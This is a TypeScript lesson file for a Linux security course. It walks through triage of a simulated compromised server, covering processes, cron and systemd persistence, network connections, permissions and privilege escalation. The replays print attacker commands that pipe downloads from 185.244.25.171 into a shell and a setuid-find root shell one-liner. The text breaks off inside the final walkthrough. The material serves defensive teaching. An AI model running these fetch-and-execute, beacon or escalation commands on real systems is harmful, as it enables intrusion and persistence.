/**
 * Linux Security Fundamentals — full lesson content.
 *
 * Rewritten from an average of 3.5 blocks per lesson. A Linux course is the
 * natural home for terminal replays, so most lessons here carry one: the point
 * is not to describe a command but to watch it run and read its output.
 *
 * Titles must match scripts/seed-academy/course-4-linux.ts exactly.
 */

import {
  type Course, lesson, text, code, callout, check,
  terminal, cmd, out, note, walkthrough, step, diagram, stage, practice,
} from "./blocks";

export const LINUX_SECURITY: Course = {
  slug: "linux-security-fundamentals",
  modules: [
    {
      title: "Linux Basics",
      description: "Getting comfortable at the shell.",
      lessons: [
        lesson(
          "The Command Line",
          "Why the shell is the primary tool for Linux security work, and the handful of commands that carry most of it.",
          8,
          [
            text(
              "Almost all Linux security work happens at the command line, and not because graphical tools are unavailable. It is because the shell is scriptable, works identically over a remote connection, leaves a record of exactly what was done, and reaches everything on the system.\n\nWhen you investigate a compromised host, you will very often have nothing but a shell. Being fluent in it is not optional.",
            ),
            terminal(
              "Orienting yourself on an unfamiliar host",
              "analyst@web-01",
              [
                note("The first questions on any host: who am I, where am I, and what is this machine?"),
                cmd("id"),
                out(`uid=1001(analyst) gid=1001(analyst) groups=1001(analyst),27(sudo)`),
                note("Membership of the sudo group matters — it is the difference between looking and acting."),
                cmd("uname -a"),
                out(`Linux web-01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux`),
                cmd("cat /etc/os-release | head -2"),
                out(`PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"`),
                note("Kernel version and distribution together tell you which privilege-escalation exploits might apply."),
                cmd("w"),
                out(` 02:41:09 up 21 days,  4:11,  2 users,  load average: 0.08, 0.03, 0.01
USER     TTY      FROM             LOGIN@   IDLE   WHAT
deploy   pts/0    185.244.25.171   02:13    0.00s  -bash
analyst  pts/1    10.20.4.15       02:40    0.00s  w`),
                note("Two users logged in. deploy is connected from an external address you do not recognise — that is the thread to pull."),
              ],
            ),
            text(
              "Notice the method more than the commands. `id`, `uname`, `w` — each answers one question, and together they build a picture in seconds: who you are, what the machine is, and who else is on it.\n\nThat last one, an unfamiliar user connected from an external address, is exactly the kind of thing that a graphical tool buries and the shell puts in front of you immediately.",
            ),
            check(
              "You land on a host and run `w`. It shows a user logged in from an external IP address you do not recognise. Why is this significant on a server?",
              [
                "Servers should never have any users logged in",
                "Interactive logins on a server are unusual, and one from an unrecognised external address is a strong lead",
                "The `w` command is unreliable and should be ignored",
                "External addresses always indicate a VPN",
              ],
              1,
              "Servers usually run services, not interactive sessions. A human shell logged in from an address that is neither an admin jump host nor a known range is precisely the anomaly worth investigating first.",
            ),
          ],
        ),
        lesson(
          "Pipes, Redirects & Find",
          "Combining small commands into investigative tools, and searching a filesystem by properties rather than name.",
          7,
          [
            text(
              "The power of the shell is composition. Each command does one thing; the pipe passes the output of one as the input to the next, and a few of them chained together answer questions no single tool was built for.\n\nThis is the core investigative skill on Linux. You are rarely looking for a command that does what you want — you are building one from parts.",
            ),
            terminal(
              "Building an answer from small parts",
              "analyst@web-01",
              [
                note("Which processes are consuming the most memory? Sort the process list and take the top few."),
                cmd("ps aux --sort=-%mem | head -4"),
                out(`USER   PID  %CPU %MEM    VSZ   RSS TTY  STAT COMMAND
mysql  894   0.5 18.2 1824m  740m ?    Ssl  /usr/sbin/mysqld
www-d 1841   0.1  2.1  612m   84m ?    S    nginx: worker
root 31882   0.0  0.3   12m    9m ?    S    /tmp/.x -c 185.244.25.171`),
                note("The third process runs from /tmp with an IP address as an argument. That does not belong on a web server."),
                cmd("find / -type f -newermt '2026-08-06 02:00' -not -path '/proc/*' 2>/dev/null | head"),
                out(`/tmp/.x
/tmp/.a.sh
/home/deploy/.ssh/authorized_keys`),
                note("find located everything changed since 02:00 by modification time, not by name. A new authorized_keys entry is how an attacker keeps SSH access."),
                cmd("cat /home/deploy/.ssh/authorized_keys"),
                out(`ssh-ed25519 AAAAC3Nza...attacker-key deploy@backup
ssh-rsa AAAAB3Nza...legitimate deploy@ci-runner`),
                note("Two keys where there should be one. The first was added tonight — that is persistence, found by searching on time rather than on name."),
              ],
            ),
            text(
              "The lesson is that `find` searching by **property** — modification time, size, permissions, ownership — is far more powerful for security work than searching by name. An attacker chooses the filename; they cannot as easily choose not to leave a modification timestamp.\n\n`find / -newermt` to bound by time, `-perm` to find world-writable or setuid files, `-size` to find something suspiciously large. These are the workhorses of host investigation.",
            ),
            practice(
              "Write a find command that locates every file under /var modified in the last 10 minutes — the window an attacker's recent activity would fall in.",
              ["find", "/var", "-mmin"],
              "find /var -type f -mmin -10",
              "Searching by modification time finds recent activity regardless of what the files are named. -mmin -10 means 'modified less than 10 minutes ago', which is exactly the property that a filename cannot disguise.",
              {
                forbids: ["-name"],
              },
            ),
            check(
              "Why is searching a filesystem by modification time often more useful in an investigation than searching by filename?",
              [
                "Filename searches are much slower on large filesystems",
                "An attacker controls what a file is called but leaves a modification timestamp they cannot easily choose",
                "Modification times are stored in a separate, tamper-proof database",
                "Filenames are not indexed by the find command",
              ],
              1,
              "A file dropped during an intrusion can be named anything, including something that looks legitimate. Its modification time places it in the window of the activity you are investigating, which is a property the attacker does not get to pick when they write the file.",
            ),
          ],
        ),
      ],
    },
    {
      title: "The Filesystem",
      description: "Where everything lives.",
      lessons: [
        lesson(
          "Filesystem Hierarchy",
          "A map of where things live on a Linux system, and which directories matter in an investigation.",
          8,
          [
            text(
              "Linux organises everything under a single root, and the layout is standardised enough that knowing it tells you where to look. In an investigation, the hierarchy is a map of where evidence lives and where attackers tend to work.",
            ),
            code(
              `Path        Holds                         Investigative relevance
─────────   ───────────────────────────   ─────────────────────────────
/etc        System configuration          Persistence: cron, services,
                                           passwd, ssh config
/var/log    Logs                          Primary evidence source
/home       User home directories         .ssh keys, shell history, dropped
                                           files
/tmp        World-writable temp           Common staging area — anyone can
/var/tmp    Persistent temp               write here
/proc       Live kernel/process state     Running processes, open files,
                                           network — the live truth
/usr/bin    System binaries               Rarely modified; changes are
/bin        Core binaries                 worth noticing
/dev/shm    Shared memory, world-writable Fileless staging — leaves no
                                           trace on disk`,
              "text",
              "The world-writable directories — /tmp, /var/tmp, /dev/shm — are where dropped tooling lands.",
            ),
            text(
              "Two entries deserve emphasis for an investigator.\n\n**/proc** is not really a filesystem — it is a live window into the kernel. `/proc/<pid>/exe` is the actual binary a process is running even if the file was deleted from disk, and `/proc/<pid>/cwd` is its working directory. This is where you find the truth about a running process that is trying to hide.\n\n**/dev/shm** is world-writable and lives in memory, which makes it a favourite for staging that leaves nothing on disk to find later.",
            ),
            callout(
              "info",
              "The world-writable directories are the first place to look",
              "Any user can write to /tmp, /var/tmp and /dev/shm, which is exactly why attackers use them — no privilege is needed to drop a tool there. When triaging a host, recent files in these three directories are among the highest-value things to check.",
            ),
            check(
              "A process is running from a binary that has since been deleted from disk. Where can you still recover the executable?",
              [
                "It is unrecoverable once deleted",
                "From /proc/<pid>/exe, which references the running binary even after the file is unlinked",
                "From /tmp, where a copy is always kept",
                "From the system journal",
              ],
              1,
              "A deleted file whose inode is still held open by a running process remains accessible through /proc/<pid>/exe. Attackers delete their binary to hide it, but as long as the process runs, the executable can be copied straight back out.",
            ),
          ],
        ),
        lesson(
          "Files, Links & Hidden Data",
          "How files can hide in plain sight, and the places routine listing does not show.",
          6,
          [
            text(
              "Not everything on a filesystem is visible to a casual look, and attackers rely on that. Several mechanisms let data hide from someone who only runs a plain `ls`.",
            ),
            terminal(
              "Finding what a plain listing hides",
              "analyst@web-01",
              [
                note("A plain ls hides dotfiles. On Linux, a leading dot only means 'do not show by default' — it is not a security feature."),
                cmd("ls /tmp"),
                out(`systemd-private-8f2a  snap.lxd`),
                cmd("ls -la /tmp"),
                out(`drwxrwxrwt 12 root root 4096 Aug  6 02:14 .
drwxr-xr-x 20 root root 4096 Jul 16 09:02 ..
-rwxr-xr-x  1 www-data www-data 1841 Aug  6 02:14 .a.sh
-rw-r--r--  1 root root 8210 Aug  6 02:14 ...
drwxrwxrwt  2 root root 4096 Jul 16 09:02 systemd-private-8f2a`),
                note("Two hidden entries the first listing missed: .a.sh, and a file whose name is three dots, designed to blend in beside the . and .. entries."),
                cmd(`file '/tmp/...'`),
                out(`/tmp/...: ELF 64-bit LSB executable, x86-64, statically linked, stripped`),
                note("A statically linked, stripped ELF binary hiding under a name that looks like directory navigation. Statically linked means it carries its own libraries — it will run anywhere."),
                cmd("ls -la /usr/bin/ | grep -v ' root '"),
                out(`-rwsr-xr-x 1 root root  1.1M Aug  6 02:14 /usr/bin/find`),
                note("find is owned by root but has the setuid bit and a modification time of tonight. A core binary changing today, gaining setuid, is a strong sign of tampering."),
              ],
            ),
            text(
              "The techniques on display: **dotfiles** hidden from default listing, names like `...` that blend in beside `.` and `..`, and **trailing spaces or unicode** in filenames that make two files look identical. None is sophisticated, and all of them work against someone not looking carefully.\n\n**Symbolic links** add another layer — a link can point somewhere unexpected, so a file that appears to be in a safe location may resolve to something else entirely. `ls -la` shows link targets; `find -type l` lists them.",
            ),
            check(
              "Why does a leading dot on a filename provide no security, only convenience?",
              [
                "Dotfiles are encrypted by the filesystem",
                "The dot merely tells listing tools to hide the file by default; `ls -a` and `find` see it normally",
                "Only root can read dotfiles",
                "Dotfiles are excluded from backups",
              ],
              1,
              "Hiding from a default listing is a display convention, not access control. Anyone who adds `-a` to `ls`, or uses `find`, sees the file exactly as they would any other — which is why relying on it to hide something, or being reassured by its absence, are both mistakes.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Permissions",
      description: "The core of Linux security.",
      lessons: [
        lesson(
          "Reading Permissions",
          "The permission string every file carries, and how to read it at a glance.",
          9,
          [
            text(
              "Linux permissions look cryptic and are actually simple once decoded. Every file carries permissions for three classes — the owner, the group, and everyone else — each able to read, write or execute.\n\nReading the ten-character string fluently is a basic skill that pays off constantly, because the wrong permission on the wrong file is one of the most common weaknesses on a real system.",
            ),
            code(
              `-rwxr-x---  1  deploy  developers  2048  Aug  6 02:14  deploy.sh

│└┬┘└┬┘└┬┘    │  └──┬─┘  └───┬────┘
│ │  │  │     │     │        │
│ │  │  │     │     │        └─ group that owns the file
│ │  │  │     │     └────────── user that owns the file
│ │  │  │     └──────────────── (link count)
│ │  │  └─ others:  ---  no access
│ │  └──── group:   r-x  read, execute
│ └─────── owner:   rwx  read, write, execute
└───────── type:    -    regular file (d=dir, l=link)`,
              "text",
              "Read it in groups of three. Owner, group, others.",
            ),
            text(
              "The same permissions are written as octal, which you will see everywhere. Each group of three becomes a digit: read is 4, write is 2, execute is 1, added together.\n\nSo `rwx` is 7, `r-x` is 5, `r--` is 4. The file above is `750`. `chmod 644` is `rw-r--r--` — owner writes, everyone reads — which is the normal state for a regular data file.",
            ),
            code(
              `Octal   Symbolic   Meaning                Typical use
─────   ────────   ────────────────────   ──────────────────────
644     rw-r--r--  owner writes, all read  Regular files
600     rw-------  owner only              Private keys, secrets
755     rwxr-xr-x  all execute, owner      Programs, directories
                   writes
700     rwx------  owner only, full        Private directories
777     rwxrwxrwx  everyone, everything    Almost always wrong`,
              "text",
              "777 is a red flag. It means any user on the system can modify the file.",
            ),
            check(
              "A private SSH key has permissions 644 (rw-r--r--). Why is this a problem?",
              [
                "SSH keys must be executable to work",
                "Any user on the system can read the private key, which is enough to impersonate its owner",
                "644 prevents the owner from using the key",
                "The key will expire faster with these permissions",
              ],
              1,
              "A private key is a secret, so it must be readable only by its owner — 600. At 644 every local user can read it, and SSH itself refuses to use a key with permissions that loose precisely because readable-by-others makes it worthless as a credential.",
            ),
          ],
        ),
        lesson(
          "chmod, chown & SUID",
          "Changing permissions and ownership, and the special bit that is the most common Linux privilege-escalation route.",
          8,
          [
            text(
              "`chmod` changes permissions and `chown` changes ownership. Both are routine. What makes this lesson a security topic is a third mechanism layered on top: the **setuid** bit, which is one of the most exploited features on Linux.",
            ),
            text(
              "Normally a program runs with the privileges of whoever launched it. A **setuid** program runs with the privileges of the file's *owner* instead, regardless of who starts it. When the owner is root, any user who runs the program is briefly operating as root.\n\nThis exists for good reasons — `passwd` must edit a root-owned file to change your password — but every setuid-root binary is a potential escalation path, and a setuid bit on the wrong program hands out root.",
            ),
            terminal(
              "Auditing setuid binaries",
              "analyst@web-01",
              [
                note("List every setuid binary on the system. This is the standard privilege-escalation enumeration step."),
                cmd("find / -perm -4000 -type f 2>/dev/null"),
                out(`/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/find
/bin/cp`),
                note("The first three are expected. The last two are not — find and cp with setuid root are known escalation vectors."),
                cmd("ls -la /usr/bin/find /bin/cp"),
                out(`-rwsr-xr-x 1 root root 320K Aug  6 02:14 /usr/bin/find
-rwsr-xr-x 1 root root 151K Aug  6 02:14 /bin/cp`),
                note("The 's' in place of the owner's 'x' is the setuid bit. Both were modified tonight."),
                cmd("find . -exec /bin/sh -p \\; -quit"),
                out(`# id
uid=1001(analyst) euid=0(root) groups=1001(analyst)`),
                note("find can run commands, so setuid-root find gives an instant root shell. euid=0 means we are now effectively root. This is why an unexpected setuid binary is critical."),
              ],
            ),
            callout(
              "danger",
              "An unexpected setuid-root binary is a critical finding",
              "Programs that can run other commands, read arbitrary files or write arbitrary files — find, cp, vim, less, and many more — become root-level tools the moment they are setuid root. Enumerating setuid binaries is one of the first things both attackers and defenders do, and any that should not be there is an immediate escalation.",
            ),
            check(
              "An attacker adds the setuid bit to /bin/cp, owned by root. What does this achieve?",
              [
                "Nothing — cp cannot be used to gain privileges",
                "Any user can now copy over or read root-owned files by running cp, effectively as root",
                "It only affects files cp itself owns",
                "It makes cp run faster for root",
              ],
              1,
              "setuid-root cp runs with root's privileges whoever launches it, so any user can overwrite root-owned files — /etc/passwd, a cron file, an authorized_keys — or read files they should not. It is a durable root capability planted in a trusted binary, which is why the modification time on core binaries is worth checking.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Processes & Services",
      description: "What's running, and how it's managed.",
      lessons: [
        lesson(
          "Inspecting Processes",
          "Finding what is running, what it descends from, and what does not belong.",
          8,
          [
            text(
              "A process is a running program, and inspecting processes is how you find out what a system is actually doing right now. The key relationships are the parent-child links: every process was started by another, and that lineage frequently reveals what a flat list conceals.",
            ),
            terminal(
              "Reading process lineage",
              "analyst@web-01",
              [
                note("A flat list shows what runs. The tree shows what started what, which is where the anomalies hide."),
                cmd("ps -eo pid,ppid,user,etime,cmd --sort=start_time | tail -5"),
                out(`  PID  PPID USER     ELAPSED CMD
 1841     1 www-data  14-02:33 nginx: worker process
31880  1841 www-data     5:12 /bin/sh -c curl 185.244.25.171/s | sh
31881 31880 www-data     5:11 curl 185.244.25.171/s
31882 31880 www-data     5:10 /tmp/.x -c 185.244.25.171`,
                ),
                note("Read the PPID column. nginx (1841) spawned a shell (31880), which spawned curl and a binary in /tmp. A web server has no legitimate reason to do this."),
                cmd("ls -la /proc/31882/exe /proc/31882/cwd"),
                out(`lrwxrwxrwx 1 www-data www-data 0 /proc/31882/exe -> '/tmp/.x (deleted)'
lrwxrwxrwx 1 www-data www-data 0 /proc/31882/cwd -> /tmp`),
                note("The binary shows as '(deleted)' — the attacker removed it from disk while it kept running. /proc still holds it."),
                cmd("cat /proc/31882/exe > /tmp/recovered.bin && file /tmp/recovered.bin"),
                out(`/tmp/recovered.bin: ELF 64-bit LSB executable, x86-64, statically linked`),
                note("Recovered the deleted binary straight from /proc for analysis. The process tried to hide by deleting itself; the running process gave it away."),
              ],
            ),
            text(
              "The single most useful idea here is that a **parent-child relationship can be wrong in a way neither process is individually**. nginx is fine. A shell is fine. curl is fine. nginx spawning a shell that spawns curl is not fine — a web server serving pages has no reason to launch a downloader.\n\nThis is the same reasoning that underlies detection engineering, and it applies just as well at the shell as in a SIEM.",
            ),
            check(
              "You see that the nginx web server process is the parent of a `/bin/sh` process. Why is this worth investigating even though both programs are legitimate?",
              [
                "nginx and sh should never exist on the same host",
                "A web server has no normal reason to spawn an interactive shell, so the relationship itself is the anomaly",
                "Shell processes always indicate malware",
                "nginx cannot legitimately be a parent process",
              ],
              1,
              "Neither program is suspicious alone. The relationship is: a web server spawning a shell is a hallmark of a web exploit dropping to command execution, which is why parent-child lineage reveals what a flat list of process names hides.",
            ),
          ],
        ),
        lesson(
          "Services, systemd & Cron",
          "How programs are set to run automatically, and why that is exactly where persistence lives.",
          7,
          [
            text(
              "For an attacker, getting code to run once is not enough — a reboot or a logout ends it. **Persistence** is the mechanisms that make code run again automatically, and on Linux those mechanisms are services and scheduled tasks. Which means the places that legitimately start programs are the same places you hunt for persistence.",
            ),
            code(
              `Mechanism            Where it lives                    Runs when
──────────────────   ───────────────────────────────   ──────────────────
systemd service      /etc/systemd/system/*.service     Boot, or on demand
                     ~/.config/systemd/user/           User login
cron (system)        /etc/crontab, /etc/cron.d/         Scheduled times
cron (user)          crontab -l per user               Scheduled times
@reboot cron         crontab with @reboot              Every boot
.bashrc / .profile   ~/.bashrc, /etc/profile.d/         Every shell start
SSH keys             ~/.ssh/authorized_keys            Every SSH login`,
              "text",
              "Every row is a legitimate feature and a persistence technique. Check all of them.",
            ),
            terminal(
              "Checking the persistence locations",
              "analyst@web-01",
              [
                note("Start with cron. A @reboot entry runs on every boot and is a favourite for persistence."),
                cmd("cat /etc/cron.d/* 2>/dev/null; crontab -l 2>/dev/null"),
                out(`* * * * * root curl -s 185.244.25.171/beacon | bash
@reboot deploy /tmp/.x -c 185.244.25.171`),
                note("A root cron job beaconing every minute, and a @reboot entry restarting the /tmp binary. Two persistence mechanisms in one file."),
                cmd("systemctl list-unit-files --state=enabled | grep -iv 'ssh\\|network\\|systemd\\|cron'"),
                out(`app-update.service   enabled`),
                cmd("cat /etc/systemd/system/app-update.service"),
                out(`[Service]
ExecStart=/usr/bin/curl -s http://185.244.25.171/u -o /tmp/.x
ExecStartPost=/bin/chmod +x /tmp/.x

[Install]
WantedBy=multi-user.target`),
                note("A service named to look routine, pointed at the same address as the cron jobs. Three persistence mechanisms, all calling home to 185.244.25.171 — remove one and the others bring it back."),
              ],
            ),
            callout(
              "warning",
              "Attackers plant more than one",
              "Persistence is deliberately redundant. Removing the cron job while leaving the systemd service means the intrusion returns on the next boot. Enumerate every mechanism before removing any, or you clean the host and it reinfects itself from a mechanism you missed.",
            ),
            check(
              "During cleanup you find and remove a malicious cron job. Why is the host not yet clean?",
              [
                "Cron jobs cannot be fully removed without a reboot",
                "Attackers commonly plant several independent persistence mechanisms, so others may restore access",
                "Removing a cron job disables all scheduling on the host",
                "The cron job will automatically recreate itself",
              ],
              1,
              "Persistence is built to be redundant. A systemd service, an authorized_keys entry or a .bashrc line can each re-establish the intrusion after the cron job is gone, which is why every mechanism must be enumerated before any is removed.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Linux Networking",
      description: "Connections in and out.",
      lessons: [
        lesson(
          "Inspecting Network Connections",
          "Seeing which processes are talking to the network, and tying a connection back to the program behind it.",
          8,
          [
            text(
              "Malware has to communicate — to receive commands, to send data out. That makes network connections one of the most reliable places to find it, and the crucial skill is tying a connection back to the process responsible for it.\n\nA suspicious connection is a lead; the process behind it is the finding.",
            ),
            terminal(
              "From a connection to the process behind it",
              "analyst@web-01",
              [
                note("List listening ports and established connections, with the owning process. The -p flag is the important one."),
                cmd("ss -tulpn"),
                out(`Netid State  Local Address:Port  Peer Address:Port  Process
tcp   LISTEN 0.0.0.0:22          0.0.0.0:*          sshd
tcp   LISTEN 0.0.0.0:80          0.0.0.0:*          nginx
tcp   LISTEN 127.0.0.1:9001      0.0.0.0:*          (pid=31882,'.x')
tcp   ESTAB  10.20.4.9:44120     185.244.25.171:443 (pid=31882,'.x')`),
                note("A process called '.x' is both listening on a local port and connected out to an external address. That dual role is characteristic of a backdoor."),
                cmd("ls -la /proc/31882/exe"),
                out(`lrwxrwxrwx 1 www-data www-data 0 /proc/31882/exe -> '/tmp/.x (deleted)'`),
                note("Same deleted binary in /tmp. The network view and the process view point at the same thing from different angles."),
                cmd("ss -tp state established '( dport = :443 )' | grep -v nginx"),
                out(`ESTAB  10.20.4.9:44120  185.244.25.171:443  users:(("...x",pid=31882))`),
                note("Filtering established connections to the outbound HTTPS, minus the web server's own, isolates the beacon. The process, the port and the destination all agree."),
              ],
            ),
            text(
              "`ss -tulpn` is the command to remember: TCP and UDP, listening and established, numeric ports, with the process. The `-p` flag — showing which program owns each socket — is what turns a list of connections into an investigation.\n\nA process that is both listening for inbound connections and reaching out to an external address is a classic backdoor shape: it takes commands and it reports back.",
            ),
            check(
              "Which piece of information turns a suspicious network connection into an actionable finding?",
              [
                "The exact byte count transferred",
                "The process that owns the socket, which identifies the program responsible",
                "The DNS name of the local host",
                "The TCP sequence numbers",
              ],
              1,
              "A connection to a suspicious address is a lead, but you cannot act on it without knowing what is making it. The owning process — revealed by `ss -p` and traceable through /proc — is what you investigate, contain and remove.",
            ),
          ],
        ),
        lesson(
          "Firewalls & SSH Hardening",
          "Controlling what reaches the box and how remote access is secured — the two exposures that matter most.",
          7,
          [
            text(
              "Two controls do most of the work of protecting a Linux server's network exposure: a firewall deciding what may connect, and a hardened SSH configuration securing the one service almost every server exposes.",
            ),
            text(
              "A **host firewall** — ufw or nftables — should default to denying inbound and permit only the ports actually needed. The frequently neglected half is **outbound**: a server that only ever needs to reach a package mirror and a database has no reason to connect to an arbitrary address on the internet, and restricting egress is what catches command-and-control after a compromise.",
            ),
            code(
              `Setting in /etc/ssh/sshd_config     Why it matters
─────────────────────────────────   ──────────────────────────────────
PermitRootLogin no                  No direct root — attacker must
                                    compromise a user AND escalate
PasswordAuthentication no           Keys only — defeats password
                                    guessing entirely
PubkeyAuthentication yes            Cryptographic identity
AllowUsers deploy admin             Explicit allow-list of who may
                                    log in at all
Port 22                             Changing it reduces log noise,
                                    not real risk — obscurity only`,
              "text",
              "Key-only authentication is the single highest-value change. It removes password guessing entirely.",
            ),
            callout(
              "tip",
              "Key-only auth removes an entire attack class",
              "Disabling password authentication means the endless SSH brute-force traffic every internet-facing server receives simply cannot succeed — there is no password to guess. It is the single most effective SSH hardening step, and it turns those thousands of failed-login log lines from a threat into background noise.",
            ),
            check(
              "Why is disabling SSH password authentication more valuable than moving SSH to a non-standard port?",
              [
                "A non-standard port breaks legitimate automation",
                "Key-only authentication removes password guessing entirely, whereas a different port only reduces log noise",
                "Non-standard ports are blocked by most firewalls",
                "Password authentication is required for key authentication to work",
              ],
              1,
              "Moving the port is obscurity — a scanner finds the new port quickly and the underlying weakness is untouched. Disabling passwords removes the guessing attack itself, because there is no longer a secret that can be guessed, only a key that must be possessed.",
            ),
          ],
        ),
      ],
    },
    {
      title: "System Hardening",
      description: "Reducing the attack surface.",
      lessons: [
        lesson(
          "Hardening Principles",
          "The idea underneath every specific hardening step: less running means less to attack.",
          8,
          [
            text(
              "Hardening is the practice of reducing a system's attack surface — the sum of everything an attacker could target. The principle beneath every specific measure is the same: **anything that is not there cannot be attacked**.\n\nA service you do not run cannot be exploited. An account that does not exist cannot be compromised. A package that is not installed contributes no vulnerabilities. Most hardening is subtraction.",
            ),
            code(
              `Reduce                     By                              Removes
────────────────────────   ─────────────────────────────   ──────────────────
Running services           Disable what you do not need    Exploitable daemons
Installed packages         Remove unused software          Vulnerable code paths
Open ports                 Firewall default-deny           Reachable services
User accounts              Remove stale, disable defaults  Compromisable logins
Privileges                 Least privilege everywhere      Blast radius
setuid binaries            Remove the bit where unneeded   Escalation paths`,
              "text",
              "Every row makes the system smaller. Smaller is harder to attack.",
            ),
            text(
              "The tension is that hardening trades against convenience, and the trade has to be deliberate. Removing a service someone occasionally needs causes a support call; leaving it running for the rare case is a permanent exposure for an occasional benefit.\n\nThe discipline is to decide these consciously rather than defaulting to 'leave it on in case', which is how systems accumulate the surface that eventually gets exploited.",
            ),
            callout(
              "info",
              "A baseline makes drift visible",
              "Capture a system's intended state — services, packages, open ports, users — and you can detect when reality diverges from it. A new listening port or an unexpected setuid binary stands out immediately against a known baseline, whereas on an undocumented system it is invisible.",
            ),
            check(
              "What is the underlying reason that disabling an unused service improves security?",
              [
                "Disabled services free up memory for security tools",
                "A service that is not running cannot be exploited, so removing it eliminates that attack surface entirely",
                "Disabled services are automatically monitored more closely",
                "It prevents the service from being updated",
              ],
              1,
              "The most reliable way to prevent a service being exploited is for it not to be running. This is why hardening is largely subtractive — every component removed is one that can never be a vulnerability, regardless of what flaws it might have contained.",
            ),
          ],
        ),
        lesson(
          "Users, sudo & Auditing",
          "Controlling who has privilege, granting it narrowly, and recording how it is used.",
          7,
          [
            text(
              "Privilege management on Linux comes down to three questions: who has accounts, what those accounts may do with elevated rights, and whether that use is recorded. Getting all three right is what contains the damage when an account is inevitably compromised.",
            ),
            text(
              "**sudo** is the mechanism for granting elevated privilege narrowly, and its power is in that narrowness. Rather than sharing the root password, you grant specific users the ability to run specific commands as root — and every use is logged.\n\nThe common failure is granting too much. `deploy ALL=(ALL) NOPASSWD: ALL` means the deploy account is root in all but name, so compromising it — through a leaked key or a web exploit running as it — is compromising root.",
            ),
            code(
              `/etc/sudoers entry                        Grants
───────────────────────────────────────   ──────────────────────────────
deploy ALL=(ALL) NOPASSWD: ALL            Everything, no password —
                                          effectively root
deploy ALL=(root) /usr/bin/systemctl \\    Only restart one service.
  restart app.service                     Compromise buys only this.
%developers ALL=(ALL) ALL                 Everyone in the group, with
                                          their own password, full sudo`,
              "text",
              "The middle line is least privilege in practice. The first is root with extra steps.",
            ),
            text(
              "**Auditing** closes the loop. sudo use is logged to the auth log by default, and the kernel audit subsystem (auditd) can record far more — file access, privileged calls, changes to sensitive files. The point of logging privilege use is not only detection after the fact; the knowledge that actions are recorded changes behaviour, and the record is what lets you reconstruct what a compromised account actually did.",
            ),
            check(
              "A deployment account is configured with `NOPASSWD: ALL` in sudoers. A web application running as that account is exploited. What is the impact?",
              [
                "Limited — the attacker has only the web application's own privileges",
                "The attacker gains full root access, because that account can run any command as root without a password",
                "Only the deployment scripts can be affected",
                "The attacker must still guess the root password",
              ],
              1,
              "`NOPASSWD: ALL` makes the account root-equivalent, and the compromised web process inherits that. Scoping sudo to the specific commands the deployment genuinely needs would have limited the exploit to those commands rather than handing over the whole host.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Privilege Escalation",
      description: "From user to root — and stopping it.",
      lessons: [
        lesson(
          "Common Escalation Paths",
          "The handful of misconfigurations that turn a foothold into root, and why enumeration finds them.",
          9,
          [
            text(
              "Privilege escalation is the step between a foothold and control. An attacker rarely lands as root — they land as a web server account or a compromised user, and they need to climb. A small number of misconfigurations account for most of that climb, and they are the same ones a defender should audit for.",
            ),
            diagram(
              "The common routes from user to root",
              "Each is a misconfiguration rather than an exploit, which means each is something a defender can find and fix first. Enumeration is how both sides discover them.",
              [
                stage("Sudo misconfiguration", "T1548.003", "An overly broad sudo rule, or a permitted command that can spawn a shell or read arbitrary files. `sudo -l` lists exactly what the current account may do, which is why it is the first thing checked."),
                stage("SUID binaries", "T1548.001", "A setuid-root binary that can execute commands, read or write files — find, vim, cp and many others. Enumerated with `find / -perm -4000`, and each unexpected one is a potential root shell."),
                stage("Writable sensitive files", "T1222", "A world-writable cron file, systemd unit, or a script run by root on a schedule. If an unprivileged user can edit something root executes, they run code as root."),
                stage("Weak file permissions", "T1552.001", "Credentials in readable config files, private keys with loose permissions, passwords in scripts or history files. Often the fastest path, and it needs no exploit at all."),
                stage("Kernel exploits", "T1068", "A kernel old enough to have a public local-escalation exploit. Reliable when patching has lapsed, though noisier and riskier than a misconfiguration."),
                stage("Cron and PATH abuse", "T1053.003", "A root cron job that calls a program by name rather than full path, where the attacker can place a matching program earlier in PATH, or edit a writable script the job runs."),
              ],
            ),
            text(
              "Notice that five of the six are misconfigurations, not exploits. That is the important lesson for a defender: **most escalation is prevented by configuration, not by patching**. Auditing sudo rules, hunting unexpected setuid binaries, and checking that root-executed files are not writable by others closes the majority of these paths.\n\nThe same enumeration that an attacker runs — `sudo -l`, `find -perm -4000`, checking cron and file permissions — is exactly what a defender should run first.",
            ),
            check(
              "Most Linux privilege-escalation paths are misconfigurations rather than software exploits. What does this imply for defence?",
              [
                "Patching is the only effective defence against escalation",
                "Auditing configuration — sudo rules, setuid binaries, file permissions — prevents most escalation without needing any patch",
                "Escalation cannot be prevented, only detected",
                "Only kernel updates matter for escalation",
              ],
              1,
              "If most paths are misconfigurations, most are closed by fixing configuration rather than by patching software. Running the same enumeration an attacker would — sudo rights, setuid binaries, writable root-run files — and fixing what it finds removes the majority of escalation routes.",
            ),
          ],
        ),
        lesson(
          "Mini Assessment: Find the Escalation",
          "Enumerate a host the way an attacker would and identify the path from user to root.",
          8,
          [
            text(
              "You have a shell as a low-privilege user on a host and need to reach root. Work the enumeration in order — each command below is a standard step — and identify the escalation path before the walkthrough spells it out.",
            ),
            code(
              `$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ sudo -l
Sorry, user www-data may not run sudo on this host.

$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd   /usr/bin/sudo   /usr/bin/mount   /usr/bin/vim.basic

$ ls -la /etc/cron.d/
-rw-rw-rw- 1 root root  102 Aug  6 01:00 backup-job`,
              "text",
              "Two of these four commands reveal a path to root. Which, and how?",
            ),
            walkthrough(
              "Finding the way to root",
              "Two candidate paths appear in that output. Work out which is real, and which is a dead end, before reaching for either.",
              [
                step(
                  "Rule out sudo immediately",
                  "The first thing any escalation attempt checks is sudo rights, and here there are none. www-data may not run sudo at all, so that entire category of path is closed.",
                  {
                    insight: "Checking and eliminating sudo first is standard. It is the cleanest escalation when available and the fastest to rule out when not.",
                  },
                ),
                step(
                  "Notice vim in the setuid list",
                  "passwd, sudo and mount are expected setuid binaries. vim.basic is not — and vim can run shell commands, which makes a setuid-root vim a direct route to a root shell.",
                  {
                    evidence: {
